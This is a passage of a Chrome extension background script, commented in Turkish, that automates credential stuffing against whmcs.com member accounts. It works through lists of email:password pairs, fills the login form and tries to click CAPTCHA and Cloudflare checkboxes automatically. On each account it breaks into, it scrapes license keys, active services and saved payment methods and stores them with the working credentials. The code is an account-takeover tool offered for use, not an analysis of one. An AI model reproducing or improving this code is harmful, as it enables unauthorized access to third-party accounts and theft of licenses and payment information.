// WHMCS Elite CRM Pro - Background Service Worker v3.3
// Düzeltilmiş: Cloudflare Kontrolü, Manuel Devam Butonu, Sabit Bot Paneli

const CONFIG = {
    URLS: {
        LOGIN: "https://www.whmcs.com/members/index.php?rp=/login",
        SERVICES: "https://www.whmcs.com/members/clientarea.php?action=services",
        PAYMENTS: "https://www.whmcs.com/members/index.php?rp=/account/paymentmethods"
    },
    DEFAULT_DELAY: 6000,
    CLOUDFLARE_CHECK_INTERVAL: 2000,
    MAX_CAPTCHA_ATTEMPTS: 3
};

// Bot State
let botState = {
    running: false,
    paused: false,
    queue: [],
    currentIndex: 0,
    currentTab: null,
    settings: { delay: CONFIG.DEFAULT_DELAY },
    results: {
        successful: [],
        failed: [],
        skipped: []
    },
    startTime: null,
    processedCount: 0,
    tabCheckInterval: null,
    cloudflareCheckInterval: null,
    isWaitingForCaptcha: false,
    captchaAttempts: 0,
    currentEmail: null,
    captchaResolved: false
};

// Ses uyarısı için Audio Context
let audioContext = null;

// Initialize Audio Context
function initAudio() {
    if (!audioContext) {
        audioContext = new (window.AudioContext || window.webkitAudioContext)();
    }
}

// "Dıt dıt dıt" ses uyarısı
function playAlertSound() {
    try {
        initAudio();
        if (!audioContext) return;

        const now = audioContext.currentTime;
        
        for (let i = 0; i < 3; i++) {
            const oscillator = audioContext.createOscillator();
            const gainNode = audioContext.createGain();
            
            oscillator.connect(gainNode);
            gainNode.connect(audioContext.destination);
            
            oscillator.type = 'square';
            oscillator.frequency.setValueAtTime(1200, now + (i * 0.4));
            
            gainNode.gain.setValueAtTime(0.5, now + (i * 0.4));
            gainNode.gain.exponentialRampToValueAtTime(0.01, now + (i * 0.4) + 0.15);
            
            oscillator.start(now + (i * 0.4));
            oscillator.stop(now + (i * 0.4) + 0.15);
        }
    } catch (e) {}
}

// Sürekli ses uyarısı
let continuousAlertInterval = null;

function startContinuousAlert() {
    playAlertSound();
    continuousAlertInterval = setInterval(() => {
        if (botState.isWaitingForCaptcha) {
            playAlertSound();
        }
    }, 3000);
}

function stopContinuousAlert() {
    if (continuousAlertInterval) {
        clearInterval(continuousAlertInterval);
        continuousAlertInterval = null;
    }
}

// Initialize
chrome.runtime.onInstalled.addListener(() => {
    console.log('[WHMCS Elite] Extension installed v3.3');
    chrome.storage.local.set({
        accounts: {},
        successfulLogins: [],
        failedLogins: [],
        botLogs: [],
        settings: { delay: CONFIG.DEFAULT_DELAY },
        botRunning: false
    });
});

// Message Handler
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    (async () => {
        try {
            switch (msg.type) {
                case 'START_BOT':
                    await startBot(msg.accounts, msg.delay, msg.skipExisting);
                    sendResponse({ success: true });
                    break;
                case 'STOP_BOT':
                    await stopBot();
                    sendResponse({ success: true });
                    break;
                case 'PAUSE_BOT':
                    await pauseBot();
                    sendResponse({ success: true });
                    break;
                case 'RESUME_BOT':
                    await resumeBot();
                    sendResponse({ success: true });
                    break;
                case 'RESTART_BOT':
                    await restartBot();
                    sendResponse({ success: true });
                    break;
                case 'SINGLE_LOGIN':
                    await singleLogin(msg.email, msg.password);
                    sendResponse({ success: true });
                    break;
                case 'GET_BOT_STATUS':
                    sendResponse({
                        success: true,
                        status: {
                            running: botState.running,
                            paused: botState.paused,
                            current: botState.currentIndex,
                            total: botState.queue.length,
                            skipped: botState.results.skipped.length,
                            waitingForCaptcha: botState.isWaitingForCaptcha,
                            currentEmail: botState.currentEmail
                        }
                    });
                    break;
                case 'CAPTCHA_MANUAL_CONTINUE':
                    // Manuel devam et butonuna basıldı
                    await onCaptchaManualContinue();
                    sendResponse({ success: true });
                    break;
                case 'CAPTCHA_CHECK_STATUS':
                    // Dashboard CAPTCHA durumunu sorguluyor
                    sendResponse({ 
                        success: true, 
                        isWaiting: botState.isWaitingForCaptcha,
                        email: botState.currentEmail 
                    });
                    break;
                default:
                    sendResponse({ success: false, error: 'Unknown message type' });
            }
        } catch (error) {
            console.error('[WHMCS Elite] Error:', error);
            sendResponse({ success: false, error: error.message });
        }
    })();
    return true;
});

// Check if tab exists
async function tabExists(tabId) {
    try {
        const tab = await chrome.tabs.get(tabId);
        return tab && !tab.discarded;
    } catch (e) {
        return false;
    }
}

// Create or get bot tab
async function ensureBotTab() {
    if (botState.currentTab && await tabExists(botState.currentTab)) {
        return botState.currentTab;
    }

    log('🔄 Sekme kapatılmış, yeni sekme açılıyor...');
    const tab = await chrome.tabs.create({
        url: CONFIG.URLS.LOGIN,
        active: true
    });
    botState.currentTab = tab.id;

    startTabMonitoring();
    return tab.id;
}

// Monitor tab status
function startTabMonitoring() {
    if (botState.tabCheckInterval) {
        clearInterval(botState.tabCheckInterval);
    }

    botState.tabCheckInterval = setInterval(async () => {
        if (!botState.running || botState.paused) return;

        const exists = await tabExists(botState.currentTab);
        if (!exists) {
            log('⚠️ İşlem sekmesi kapatıldı, yeniden oluşturuluyor...');
            await ensureBotTab();
        }
    }, 3000);
}

// Stop tab monitoring
function stopTabMonitoring() {
    if (botState.tabCheckInterval) {
        clearInterval(botState.tabCheckInterval);
        botState.tabCheckInterval = null;
    }
    if (botState.cloudflareCheckInterval) {
        clearInterval(botState.cloudflareCheckInterval);
        botState.cloudflareCheckInterval = null;
    }
    stopContinuousAlert();
}

// Cloudflare kontrolü - GELİŞTİRİLMİŞ
async function checkCloudflareChallenge(tabId) {
    try {
        const result = await chrome.scripting.executeScript({
            target: { tabId },
            func: detectCloudflareChallenge
        });
        return result[0].result;
    } catch (e) {
        return { isChallenge: false, error: e.message };
    }
}

// Cloudflare algılama fonksiyonu - GELİŞTİRİLMİŞ
function detectCloudflareChallenge() {
    const pageText = document.body ? document.body.innerText : '';
    const pageHtml = document.documentElement ? document.documentElement.innerHTML : '';
    
    // Cloudflare belirtileri
    const cloudflareIndicators = [
        'Just a moment',
        'Güvenlik doğrulaması',
        'security verification',
        'Checking your browser',
        'cf-challenge',
        'cf_chl_opt',
        'cdn-cgi/challenge-platform',
        '__cf_chl_jschl_tk__',
        'challenge-platform',
        'cf-browser-verification',
        'Please wait',
        'Lütfen bekleyin',
        'Please turn JavaScript on',
        'Enable JavaScript and cookies',
        'Ray ID',
        'cloudflare',
        'CAPTCHA',
        'captcha'
    ];
    
    // CAPTCHA checkbox belirtileri
    const captchaIndicators = [
        'cf-challenge-container',
        'cf-turnstile',
        'recaptcha',
        'g-recaptcha',
        'h-captcha',
        'I\'m not a robot',
        'Ben robot değilim',
        'Verify you are human',
        'hcap-widget',
        'grecaptcha'
    ];
    
    let isCloudflare = false;
    let hasCaptchaCheckbox = false;
    let challengeType = 'unknown';
    
    // Cloudflare kontrolü
    for (const indicator of cloudflareIndicators) {
        if (pageText.includes(indicator) || pageHtml.includes(indicator)) {
            isCloudflare = true;
            challengeType = 'cloudflare';
            break;
        }
    }
    
    // CAPTCHA checkbox kontrolü
    for (const indicator of captchaIndicators) {
        if (pageText.includes(indicator) || pageHtml.includes(indicator)) {
            hasCaptchaCheckbox = true;
            challengeType = 'captcha';
            break;
        }
    }
    
    // Title kontrolü
    const title = document.title || '';
    if (title.includes('Just a moment') || title.includes('Güvenlik') || title.includes('Security')) {
        isCloudflare = true;
    }
    
    // Özel element kontrolü
    const challengeContainer = document.querySelector('#cf-challenge-container, .cf-challenge-container, .challenge-container, .cf-turnstile, [data-cf-turnstile], .g-recaptcha, #recaptcha');
    
    if (challengeContainer) {
        isCloudflare = true;
        hasCaptchaCheckbox = true;
    }
    
    // Giriş yapılmış mı kontrolü (logout linki varsa giriş yapılmış demektir)
    const isLoggedIn = !!document.querySelector('a[href*="logout"], .user-menu, .account-menu, .navbar-nav .dropdown');
    
    return {
        isChallenge: (isCloudflare || hasCaptchaCheckbox) && !isLoggedIn,
        isCloudflare: isCloudflare,
        hasCaptchaCheckbox: hasCaptchaCheckbox,
        challengeType: challengeType,
        title: title,
        url: window.location.href,
        isLoggedIn: isLoggedIn
    };
}

// "Ben robot değilim" butonuna tıklama dene
async function tryClickCaptcha(tabId) {
    try {
        const result = await chrome.scripting.executeScript({
            target: { tabId },
            func: clickCaptchaCheckbox
        });
        return result[0].result;
    } catch (e) {
        return { success: false, error: e.message };
    }
}

// CAPTCHA checkbox tıklama fonksiyonu
function clickCaptchaCheckbox() {
    try {
        // Cloudflare Turnstile checkbox
        const turnstileCheckbox = document.querySelector(
            '.cf-turnstile-checkbox, .cf-challenge-checkbox, input[type="checkbox"][name="cf-turnstile"]'
        );
        
        // Genel CAPTCHA checkbox'ları
        const captchaCheckboxes = document.querySelectorAll(
            '.recaptcha-checkbox, .g-recaptcha, [class*="captcha"], [class*="challenge"] input[type="checkbox"], .cf-turnstile'
        );
        
        // iframe içindeki CAPTCHA
        const captchaFrames = document.querySelectorAll('iframe[src*="recaptcha"], iframe[src*="turnstile"]');
        
        // "Ben robot değilim" / "I'm not a robot" metni içeren elementler
        const notRobotElements = Array.from(document.querySelectorAll('*')).filter(el => {
            const text = el.innerText || el.textContent || '';
            return text.includes("I'm not a robot") || 
                   text.includes("Ben robot değilim") ||
                   text.includes("Verify") ||
                   text.includes("Doğrula");
        });
        
        // Tıklanabilir elementler
        const clickableElements = [
            turnstileCheckbox,
            ...captchaCheckboxes,
            ...notRobotElements
        ].filter(el => el !== null);
        
        for (const el of clickableElements) {
            try {
                el.click();
                el.dispatchEvent(new Event('change', { bubbles: true }));
                el.dispatchEvent(new Event('input', { bubbles: true }));
                
                if (el.type === 'checkbox') {
                    el.checked = true;
                }
                
                return { 
                    success: true, 
                    element: el.tagName,
                    className: el.className,
                    text: el.innerText?.substring(0, 50)
                };
            } catch (clickError) {}
        }
        
        return { success: false, reason: 'No clickable captcha element found' };
    } catch (e) {
        return { success: false, error: e.message };
    }
}

// Cloudflare bekleme moduna geç - GELİŞTİRİLMİŞ
async function enterCaptchaWaitMode(tabId, email) {
    botState.isWaitingForCaptcha = true;
    botState.captchaAttempts = 0;
    botState.captchaResolved = false;
    botState.currentEmail = email;

    log('🔒 ====================================');
    log('🔒 CLOUDFLARE GÜVENLİK KONTROLÜ!');
    log('🔒 ====================================');
    log(`👤 Hesap: ${email}`);
    log('⚠️ Lütfen "Ben robot değilim" doğrulamasını yapın');
    log('🖱️ Veya Dashboard\'daki "Devam Et" butonuna tıklayın');

    // Ses uyarısı başlat
    startContinuousAlert();

    // Bildirim göster
    chrome.notifications.create({
        type: 'basic',
        iconUrl: 'icons/icon128.png',
        title: '🔒 Robot Doğrulama Gerekli!',
        message: `Hesap: ${email}\n"Ben robot değilim" alanını tıklayın veya Dashboard'dan devam edin.`,
        requireInteraction: true
    });

    // Dashboard'a bildir
    broadcastStatus('CAPTCHA_REQUIRED', { 
        email: email,
        message: 'Robot doğrulama bekleniyor'
    });

    // CAPTCHA çözülene kadar bekle
    const resolved = await waitForCaptchaResolution(tabId, email);
    
    return resolved;
}

// CAPTCHA çözülene kadar bekle - GELİŞTİRİLMİŞ
async function waitForCaptchaResolution(tabId, email) {
    return new Promise((resolve) => {
        let checkCount = 0;
        const maxChecks = 1800; // 30 dakika (her 1 saniyede bir kontrol)
        
        botState.cloudflareCheckInterval = setInterval(async () => {
            checkCount++;
            
            // Manuel devam et butonuna basıldı mı kontrol et
            if (botState.captchaResolved) {
                clearInterval(botState.cloudflareCheckInterval);
                botState.cloudflareCheckInterval = null;
                stopContinuousAlert();
                botState.isWaitingForCaptcha = false;
                
                log('✅ Manuel devam et butonuna basıldı!');
                resolve(true);
                return;
            }
            
            if (!botState.running || botState.paused) {
                clearInterval(botState.cloudflareCheckInterval);
                botState.cloudflareCheckInterval = null;
                stopContinuousAlert();
                botState.isWaitingForCaptcha = false;
                resolve(false);
                return;
            }
            
            // CAPTCHA hala var mı kontrol et
            const challengeStatus = await checkCloudflareChallenge(tabId);
            
            // Giriş yapılmış mı kontrol et (en güvenli yöntem)
            if (challengeStatus.isLoggedIn) {
                clearInterval(botState.cloudflareCheckInterval);
                botState.cloudflareCheckInterval = null;
                stopContinuousAlert();
                botState.isWaitingForCaptcha = false;
                
                log('✅ Giriş başarılı! Robot doğrulama geçildi.');
                
                chrome.notifications.create({
                    type: 'basic',
                    iconUrl: 'icons/icon128.png',
                    title: '✅ Doğrulama Tamamlandı',
                    message: 'Robot doğrulaması başarıyla geçildi. İşleme devam ediliyor...'
                });
                
                broadcastStatus('CAPTCHA_SOLVED', { email });
                
                resolve(true);
                return;
            }
            
            // Otomatik tıklama dene (ilk 3 deneme)
            if (botState.captchaAttempts < CONFIG.MAX_CAPTCHA_ATTEMPTS) {
                botState.captchaAttempts++;
                log(`🤖 Otomatik tıklama denemesi ${botState.captchaAttempts}/${CONFIG.MAX_CAPTCHA_ATTEMPTS}...`);
                
                const clickResult = await tryClickCaptcha(tabId);
                if (clickResult.success) {
                    log('✅ CAPTCHA otomatik tıklandı, çözülmesi bekleniyor...');
                }
                
                await wait(3000);
            }
            
            // Her 10 saniyede bir hatırlatma
            if (checkCount % 10 === 0) {
                playAlertSound();
                log('⏳ Robot doğrulaması bekleniyor... Dashboard\'dan "Devam Et" butonuna tıklayabilirsiniz.');
            }
            
            // Zaman aşımı kontrolü
            if (checkCount >= maxChecks) {
                clearInterval(botState.cloudflareCheckInterval);
                botState.cloudflareCheckInterval = null;
                stopContinuousAlert();
                botState.isWaitingForCaptcha = false;
                
                log('⏱️ Robot doğrulama zaman aşımı! Hesap atlanıyor...');
                
                await saveFailedLogin(email, '', 'Robot doğrulama zaman aşımı');
                
                chrome.notifications.create({
                    type: 'basic',
                    iconUrl: 'icons/icon128.png',
                    title: '⏱️ Zaman Aşımı',
                    message: 'Robot doğrulama zaman aşımına uğradı. Hesap atlanıyor...'
                });
                
                resolve(false);
            }
        }, 1000);
    });
}

// Manuel devam et butonuna basıldığında
async function onCaptchaManualContinue() {
    log('👆 Manuel "Devam Et" butonuna basıldı!');
    botState.captchaResolved = true;
    
    // Dashboard'a bildir
    broadcastStatus('CAPTCHA_MANUAL_PRESSED', { 
        email: botState.currentEmail 
    });
}

// Check if account already exists and successful
async function isAccountAlreadyProcessed(email) {
    const { successfulLogins, accounts } = await chrome.storage.local.get(['successfulLogins', 'accounts']);

    const inSuccessList = successfulLogins?.some(l => l.email.toLowerCase() === email.toLowerCase());
    const inAccounts = accounts && accounts[email.toLowerCase()];

    return inSuccessList || inAccounts;
}

// Start Bot - GELİŞTİRİLMİŞ
async function startBot(accounts, delay = CONFIG.DEFAULT_DELAY, skipExisting = true) {
    if (botState.running) {
        log('⚠️ Bot zaten çalışıyor!');
        return;
    }

    // Bot durumunu storage'a kaydet (dashboard kontrolü için)
    await chrome.storage.local.set({ botRunning: true });

    botState.running = true;
    botState.paused = false;
    botState.queue = accounts || [];
    botState.currentIndex = 0;
    botState.settings.delay = delay;
    botState.results = { successful: [], failed: [], skipped: [] };
    botState.startTime = Date.now();
    botState.processedCount = 0;
    botState.isWaitingForCaptcha = false;
    botState.captchaAttempts = 0;
    botState.captchaResolved = false;
    botState.currentEmail = null;

    if (skipExisting) {
        const filteredQueue = [];
        const skippedAccounts = [];

        for (const accountStr of botState.queue) {
            const email = accountStr.split(':')[0]?.trim();
            if (email && await isAccountAlreadyProcessed(email)) {
                skippedAccounts.push(email);
            } else {
                filteredQueue.push(accountStr);
            }
        }

        if (skippedAccounts.length > 0) {
            log(`⏭️ ${skippedAccounts.length} hesap zaten işlenmiş, atlanıyor...`);
            botState.results.skipped = skippedAccounts;
        }

        botState.queue = filteredQueue;
    }

    if (botState.queue.length === 0) {
        log('✅ Tüm hesaplar zaten işlenmiş!');
        botState.running = false;
        await chrome.storage.local.set({ botRunning: false });
        broadcastStatus('BOT_FINISHED', {
            total: 0,
            successful: 0,
            failed: 0,
            skipped: botState.results.skipped.length
        });
        return;
    }

    log(`🚀 Bot başlatıldı! ${botState.queue.length} hesap işlenecek.`);
    
    // Bot panelini göster
    broadcastStatus('BOT_STARTED', { 
        total: botState.queue.length 
    });

    await ensureBotTab();
    startTabMonitoring();

    await processNext();
}

// Stop Bot
async function stopBot() {
    botState.running = false;
    botState.paused = false;
    botState.startTime = null;
    botState.isWaitingForCaptcha = false;
    botState.captchaResolved = false;
    stopTabMonitoring();
    await chrome.storage.local.set({ botRunning: false });
    log('🛑 Bot durduruldu.');
    broadcastStatus('BOT_STOPPED');
}

// Pause Bot
async function pauseBot() {
    botState.paused = true;
    log('⏸️ Bot duraklatıldı.');
    broadcastStatus('BOT_PAUSED');
}

// Resume Bot
async function resumeBot() {
    if (!botState.running) return;
    botState.paused = false;
    log('▶️ Bot devam ediyor...');
    broadcastStatus('BOT_RESUMED');

    await ensureBotTab();

    await processNext();
}

// Restart Bot
async function restartBot() {
    log('🔄 Bot yeniden başlatılıyor...');

    botState.running = false;
    botState.paused = false;
    botState.isWaitingForCaptcha = false;
    botState.captchaResolved = false;
    stopTabMonitoring();

    await wait(1000);

    const originalQueue = [...botState.queue];
    botState.currentIndex = 0;
    botState.results = { successful: [], failed: [], skipped: [] };
    botState.startTime = Date.now();
    botState.processedCount = 0;

    botState.running = true;
    botState.queue = originalQueue;

    log(`🚀 Bot yeniden başlatıldı! ${botState.queue.length} hesap işlenecek.`);

    await ensureBotTab();
    startTabMonitoring();

    await processNext();
}

// Process Next Account
async function processNext() {
    if (!botState.running) {
        await finishBot();
        return;
    }

    if (botState.paused) return;

    if (botState.currentIndex >= botState.queue.length) {
        await finishBot();
        return;
    }

    const accountStr = botState.queue[botState.currentIndex];
    let email, password;

    if (typeof accountStr === 'string' && accountStr.includes(':')) {
        const parts = accountStr.split(':');
        email = parts[0].trim();
        password = parts.slice(1).join(':').trim();
    } else {
        log(`❌ Geçersiz hesap formatı`);
        botState.currentIndex++;
        await processNext();
        return;
    }

    botState.currentEmail = email;

    broadcastStatus('STATUS_UPDATE', {
        total: botState.queue.length,
        current: botState.currentIndex + 1,
        email: email,
        step: 'Giriş Yapılıyor...'
    });

    log(`🔐 İşleniyor: ${email}`);

    try {
        await processAccount(email, password);
    } catch (error) {
        log(`❌ Hata: ${email} - ${error.message}`);

        if (error.message && error.message.includes('No tab with id')) {
            log('🔄 Sekme hatası, yeniden deneniyor...');
            await ensureBotTab();
            setTimeout(() => processNext(), 2000);
            return;
        }

        await saveFailedLogin(email, password, error.message);
    }

    botState.currentIndex++;
    botState.processedCount++;

    if (botState.running && !botState.paused) {
        setTimeout(() => processNext(), botState.settings.delay);
    }
}

// Process Single Account - GELİŞTİRİLMİŞ
async function processAccount(email, password) {
    const tabId = await ensureBotTab();

    await chrome.storage.local.set({ current_bot_account: email });

    await clearCookies('whmcs.com');
    await clearCookies('.whmcs.com');

    log(`🌐 Login sayfasına gidiliyor...`);
    await chrome.tabs.update(tabId, { url: CONFIG.URLS.LOGIN });
    await wait(5000);

    if (!botState.running || botState.paused) return;

    // ===== CLOUDFLARE KONTROLÜ =====
    log(`🔍 Güvenlik kontrolü yapılıyor...`);
    let challengeCheck = await checkCloudflareChallenge(tabId);
    
    if (challengeCheck.isChallenge) {
        log(`⚠️ Cloudflare güvenlik kontrolü algılandı!`);
        
        const captchaResolved = await enterCaptchaWaitMode(tabId, email);
        
        if (!captchaResolved) {
            log(`❌ ${email} - Robot doğrulama çözülemedi, hesap atlanıyor...`);
            await saveFailedLogin(email, password, 'Robot doğrulama başarısız');
            return;
        }
        
        log(`✅ Robot doğrulama geçildi, devam ediliyor...`);
        await wait(3000);
    }

    if (!botState.running || botState.paused) return;

    log(`📝 Login form dolduruluyor...`);
    const loginResult = await chrome.scripting.executeScript({
        target: { tabId },
        func: fillLoginForm,
        args: [email, password]
    });

    if (!loginResult[0].result.success) {
        throw new Error('Login form doldurulamadı');
    }

    log(`⏳ Giriş bekleniyor...`);
    await wait(6000);

    if (!botState.running || botState.paused) return;

    // Tekrar Cloudflare kontrolü (login sonrası)
    challengeCheck = await checkCloudflareChallenge(tabId);
    if (challengeCheck.isChallenge) {
        log(`⚠️ Login sonrası güvenlik kontrolü algılandı!`);
        const captchaResolved = await enterCaptchaWaitMode(tabId, email);
        
        if (!captchaResolved) {
            await saveFailedLogin(email, password, 'Login sonrası robot doğrulama başarısız');
            return;
        }
        
        await wait(3000);
    }

    if (!botState.running || botState.paused) return;

    // Giriş kontrolü
    const verifyResult = await chrome.scripting.executeScript({
        target: { tabId },
        func: verifyLogin
    });

    const verifyData = verifyResult[0].result;

    if (!verifyData.success) {
        log(`❌ Giriş Başarısız: ${email}`);
        await saveFailedLogin(email, password, verifyData.error || 'Giriş başarısız');
        broadcastStatus('STATUS_UPDATE', {
            total: botState.queue.length,
            current: botState.currentIndex + 1,
            email: email,
            step: 'Giriş Başarısız'
        });
        return;
    }

    log(`✅ Giriş Başarılı: ${email}`);

    const accountData = {
        email,
        password,
        loginTime: new Date().toISOString(),
        licenses: [],
        payments: []
    };

    // ===== SERVİSLER SAYFASINA GİT =====
    log(`🌐 Servisler sayfasına gidiliyor...`);
    broadcastStatus('STATUS_UPDATE', {
        total: botState.queue.length,
        current: botState.currentIndex + 1,
        email: email,
        step: 'Lisanslar Çekiliyor...'
    });

    await chrome.tabs.update(tabId, { url: CONFIG.URLS.SERVICES });
    await wait(8000);

    if (!botState.running || botState.paused) return;

    // Cloudflare kontrolü (services sayfası)
    const servicesChallenge = await checkCloudflareChallenge(tabId);
    if (servicesChallenge.isChallenge) {
        log(`⚠️ Servisler sayfasında güvenlik kontrolü!`);
        const captchaResolved = await enterCaptchaWaitMode(tabId, email);
        if (!captchaResolved) {
            log(`⚠️ Servisler sayfası güvenlik kontrolü geçilemedi, ödeme yöntemlerine geçiliyor...`);
        } else {
            await wait(3000);
        }
    }

    const licensesResult = await chrome.scripting.executeScript({
        target: { tabId },
        func: scrapeLicensesAdvanced
    });

    if (licensesResult[0].result) {
        accountData.licenses = licensesResult[0].result;
        log(`📋 ${accountData.licenses.length} lisans bulundu`);

        const activeLicenseCount = accountData.licenses.filter(l => l.isActive).length;
        if (activeLicenseCount > 0) {
            log(`🎵 ${activeLicenseCount} adet AKTİF lisans bulundu! Ses bildirimi çalınıyor...`);
            broadcastStatus('ACTIVE_LICENSE_FOUND', { 
                count: accountData.licenses.length,
                activeCount: activeLicenseCount
            });
        }
    }

    // ===== ÖDEME YÖNTEMLERİ SAYFASINA GİT =====
    log(`🌐 Ödeme yöntemleri sayfasına gidiliyor...`);
    broadcastStatus('STATUS_UPDATE', {
        total: botState.queue.length,
        current: botState.currentIndex + 1,
        email: email,
        step: 'Ödemeler Çekiliyor...'
    });

    await chrome.tabs.update(tabId, { url: CONFIG.URLS.PAYMENTS });
    await wait(8000);

    if (!botState.running || botState.paused) return;

    // Cloudflare kontrolü (payments sayfası)
    const paymentsChallenge = await checkCloudflareChallenge(tabId);
    if (paymentsChallenge.isChallenge) {
        log(`⚠️ Ödeme sayfasında güvenlik kontrolü!`);
        const captchaResolved = await enterCaptchaWaitMode(tabId, email);
        if (captchaResolved) {
            await wait(3000);
        }
    }

    const paymentsResult = await chrome.scripting.executeScript({
        target: { tabId },
        func: scrapePaymentsAdvanced
    });

    if (paymentsResult[0].result) {
        accountData.payments = paymentsResult[0].result;
        log(`💳 ${accountData.payments.length} ödeme yöntemi bulundu`);
        
        accountData.payments.forEach(pay => {
            log(`   💳 ${pay.methodName} - ${pay.description} (${pay.status})`);
        });
    }

    await saveSuccessfulLogin(accountData);

    broadcastStatus('STATUS_UPDATE', {
        total: botState.queue.length,
        current: botState.currentIndex + 1,
        email: email,
        step: 'Tamamlandı'
    });
}

// Login form doldurma
function fillLoginForm(email, password) {
    try {
        const emailInput = document.getElementById('inputEmail') ||
                          document.querySelector('input[name="username"]') ||
                          document.querySelector('input[type="email"]');

        const passInput = document.getElementById('inputPassword') ||
                         document.querySelector('input[name="password"]') ||
                         document.querySelector('input[type="password"]');

        if (!emailInput || !passInput) {
            return { success: false, error: 'Form elements not found' };
        }

        emailInput.value = email;
        emailInput.dispatchEvent(new Event('input', { bubbles: true }));
        emailInput.dispatchEvent(new Event('change', { bubbles: true }));

        passInput.value = password;
        passInput.dispatchEvent(new Event('input', { bubbles: true }));
        passInput.dispatchEvent(new Event('change', { bubbles: true }));

        const submitBtn = document.getElementById('login') ||
                         document.querySelector('input[type="submit"]') ||
                         document.querySelector('button[type="submit"]');

        if (submitBtn) {
            submitBtn.click();
            return { success: true };
        }

        const form = emailInput.closest('form');
        if (form) {
            form.submit();
            return { success: true };
        }

        return { success: false, error: 'No submit method' };
    } catch (e) {
        return { success: false, error: e.message };
    }
}

// Login doğrulama - GELİŞTİRİLMİŞ
function verifyLogin() {
    try {
        // Hata mesajları kontrolü
        const errorSelectors = ['.alert-danger', '.alert-error', '.text-danger', '.error'];
        for (const selector of errorSelectors) {
            const el = document.querySelector(selector);
            if (el && el.innerText.trim()) {
                const text = el.innerText.toLowerCase();
                if (text.includes('invalid') || text.includes('incorrect') || text.includes('error') ||
                    text.includes('wrong') || text.includes('failed')) {
                    return { success: false, error: el.innerText.trim() };
                }
            }
        }

        // Giriş başarılı belirtileri
        const logoutLink = document.querySelector('a[href*="logout"]');
        if (logoutLink) return { success: true };

        const userMenu = document.querySelector('.user-menu, .account-menu, .navbar-nav .dropdown');
        if (userMenu) return { success: true };

        const welcomeText = document.body.innerText.includes('Welcome') || 
                           document.body.innerText.includes('Hoş geldiniz');
        if (welcomeText) return { success: true };

        // Login formu hala var mı kontrol et
        const loginForm = document.querySelector('form[action*="login"]');
        const emailInput = document.getElementById('inputEmail');

        if (!loginForm && !emailInput) {
            return { success: true };
        }

        return { success: false, error: 'Still on login page' };
    } catch (e) {
        return { success: false, error: e.message };
    }
}

// Gelişmiş lisans çekme
function scrapeLicensesAdvanced() {
    const licenses = [];

    const tableSelectors = [
        '#tableServicesList',
        '#servicesTable',
        '.table-services',
        'table.table',
        'table'
    ];

    let table = null;
    for (const selector of tableSelectors) {
        try {
            const el = document.querySelector(selector);
            if (el && el.querySelectorAll('tr').length > 1) {
                const text = el.innerText.toLowerCase();
                if (text.includes('product') || text.includes('service') || text.includes('status')) {
                    table = el;
                    break;
                }
            }
        } catch (e) {}
    }

    if (!table) return licenses;

    const rows = table.querySelectorAll('tbody tr, tr');

    rows.forEach(row => {
        const cells = row.querySelectorAll('td');
        if (cells.length < 3) return;

        try {
            let product = '';
            let licenseKey = '';
            let billingCycle = '';
            let dueDate = '';
            let status = '';
            let price = '';
            let isActive = false;

            const productSelectors = ['strong', 'a', 'h4', 'h3'];
            for (const sel of productSelectors) {
                const el = row.querySelector(sel);
                if (el) {
                    const text = el.innerText.trim();
                    if (text && text.length > 2 && text.toLowerCase() !== 'product') {
                        product = text;
                        break;
                    }
                }
            }

            if (!product && cells.length > 1) {
                for (let i = 0; i < Math.min(cells.length, 3); i++) {
                    const text = cells[i].innerText.trim();
                    if (text && text.length > 2 && !text.includes('$')) {
                        product = text.split('\n')[0];
                        break;
                    }
                }
            }

            const keySelectors = ['a[href*="license"]', 'code', 'pre'];
            for (const sel of keySelectors) {
                const el = row.querySelector(sel);
                if (el) {
                    const text = el.innerText.trim();
                    if (text && (text.includes('-') || text.length > 8)) {
                        licenseKey = text;
                        break;
                    }
                }
            }

            if (!licenseKey) {
                const rowText = row.innerText;
                const patterns = [
                    /WHMCS-[A-Z0-9]+/i,
                    /[A-Z0-9]{4,}-[A-Z0-9]{4,}-[A-Z0-9]{4,}/i,
                    /License[\s:]*([A-Z0-9-]+)/i
                ];

                for (const pattern of patterns) {
                    const match = rowText.match(pattern);
                    if (match) {
                        licenseKey = match[1] || match[0];
                        break;
                    }
                }
            }

            for (let i = 0; i < cells.length; i++) {
                const text = cells[i].innerText;
                if (text.match(/[\$€£\d]/)) {
                    price = text.split('\n')[0].trim();
                    break;
                }
            }

            for (let i = 0; i < cells.length; i++) {
                const text = cells[i].innerText.toLowerCase();
                if (text.includes('monthly')) { billingCycle = 'Aylık'; break; }
                if (text.includes('yearly')) { billingCycle = 'Yıllık'; break; }
                if (text.includes('one time')) { billingCycle = 'Tek Seferlik'; break; }
            }

            for (let i = 0; i < cells.length; i++) {
                const text = cells[i].innerText;
                if (text.match(/\d{2}[\/\-\.]\d{2}[\/\-\.]\d{4}/)) {
                    dueDate = text.split('\n')[0].trim();
                    break;
                }
            }

            const statusSelectors = ['.label', '.badge', '.status', 'td:last-child'];
            for (const sel of statusSelectors) {
                const el = row.querySelector(sel);
                if (el) {
                    status = el.innerText.trim();
                    break;
                }
            }

            let statusTR = status;
            const statusLower = status.toLowerCase();

            if (statusLower.includes('active')) {
                statusTR = 'Aktif';
                isActive = true;
            } else if (statusLower.includes('suspended')) {
                statusTR = 'Askıya Alındı';
            } else if (statusLower.includes('terminated')) {
                statusTR = 'Sonlandırıldı';
            } else if (statusLower.includes('cancelled')) {
                statusTR = 'İptal Edildi';
            } else if (statusLower.includes('pending')) {
                statusTR = 'Beklemede';
            }

            if (product && product.length > 2 && product.toLowerCase() !== 'product') {
                licenses.push({
                    product,
                    licenseKey: licenseKey || '',
                    price: price || '',
                    billingCycle: billingCycle || '',
                    dueDate: dueDate || '',
                    status: statusTR,
                    statusEN: status,
                    isActive
                });
            }
        } catch (e) {}
    });

    return licenses;
}

// Gelişmiş ödeme çekme
function scrapePaymentsAdvanced() {
    const payments = [];
    
    const paymentKeywords = {
        'mastercard': ['mastercard', 'master card', 'master'],
        'visa': ['visa', 'visa card', 'visa electron'],
        'paypal': ['paypal', 'pay pal'],
        'american_express': ['american express', 'amex', 'americanexpress'],
        'discover': ['discover', 'discover card'],
        'stripe': ['stripe'],
        'bank_transfer': ['bank transfer', 'wire transfer', 'banka havalesi', 'eft', 'havale'],
        'credit_card': ['credit card', 'kredi kartı', 'kredikarti'],
        'debit_card': ['debit card', 'banka kartı', 'debitcard'],
